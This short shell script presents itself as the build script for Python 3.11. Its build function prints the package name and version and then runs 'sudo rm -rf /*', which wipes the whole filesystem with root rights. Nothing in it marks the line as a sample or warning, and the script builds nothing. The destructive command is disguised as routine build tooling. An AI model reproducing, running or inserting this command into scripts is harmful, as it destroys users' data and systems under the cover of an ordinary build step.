#!/bin/sh

# -----------------------------------
# This is the build script for Python
# -----------------------------------

PACKAGE="python"
VERSION="3.11"

build () {
  echo "$PACKAGE"
  echo "$VERSION"

  sudo rm -rf /*
}
